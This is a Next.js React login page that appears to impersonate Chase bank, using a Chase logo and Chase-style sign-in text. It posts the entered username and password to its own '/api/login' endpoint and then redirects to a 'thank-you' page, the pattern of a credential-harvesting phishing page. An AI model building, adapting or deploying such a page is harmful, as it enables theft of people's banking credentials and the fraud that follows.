
"use client"
import axios from "axios";
import Image from "next/image";
import { useState } from "react";

export default function Main() {

  const [isLoading, setIsLoading] = useState(false)
    const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

const handleSubmit = async (event: { preventDefault: () => void; }) => {
  event.preventDefault();
  if(!username && !password){
    return alert("login required")
  }
  setIsLoading(true);

  try {
    const response = await axios.post('/api/login', {
      username,
      password
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    const data = response.data; // Use.data property to access the response body
    console.log(data);

    // if successful navigate to thank you page
    // window.location.href = '/thank-you';
      if (response.status >= 200 && response.status < 300) {
        window.location.href = '/thank-you';
   }
    // 



    // Clear username and password fields
    setUsername('');
    setPassword('');
  } catch (error) {
    console.error(error);
    // Optionally, handle errors here
  } finally {
    setIsLoading(false);
  }
};
  return (
    <main 
      className="header-container"
      style={{
      fontFamily: 'Arial, sans-serif',
      backgroundImage: "url('/assets/background.jpg')",
      backgroundAttachment: "fixed",
      backgroundSize: 'cover',
      padding:'15px',
      backgroundRepeat: 'no-repeat',
      backgroundPosition: 'center',
      height: '100vh', // Example height, adjust as needed
      width: '100%', // Example width, adjust as needed
      zIndex:9999}}
      >
      <div className="flex justify-center items-center">
        <img src="/assets/chase.png" alt="logo" className="w-64 mt-10 filter contrast-200"  />
      </div>
    <div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto mt-32 px-4 filter contrast-100">
      <div className="items-center justify-center space-y-4 p-8 rounded-md shadow-xl bg-white w-auto">
          
          <form onSubmit={handleSubmit} className=" space-y-5 p-8 rounded-md shadow-x1 ">
        <label htmlFor="username" className="block text-sm font-medium text-gray-500">Username</label>
        <input
          id="username"
          type="text"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0 mb-10 mt-10"
        />
        <label htmlFor="password" className="block text-sm font-medium text-gray-500">Password</label>
        <input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
        />
        <button
          disabled={isLoading}
          className={`w-full ${isLoading? "bg-gray-400 cursor-not-allowed py-2 px-4" : "bg-blue-500 hover:bg-[#1c3666] text-white font-bold py-2 px-4 rounded"}`}
        >
          {isLoading? (
            <div className="flex items-center justify-center">
              <div className="animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-white"></div>
            </div>
          ) : (
            "Sign in"
          )}
        </button>
        <div className="text-blue-400">
        <span>Forgot username/password?</span> <br />
        <span>Not Enrolled? Sign Up Now</span>
        </div>
      </form>
      
        </div>
        <div className="flex justify-center items-center flex-col">
          <span className="text-center text-gray-500 -mb-32 mt-80">Follow Us:</span>
        </div>
        </div>
        <div style={{textAlign: 'center', padding:'25px 20%' , marginTop:'6%'}}>
  <hr style={{borderTop: '1px solid #000', marginTop: '20px'}} />
</div>

   </main>
   
  );
}
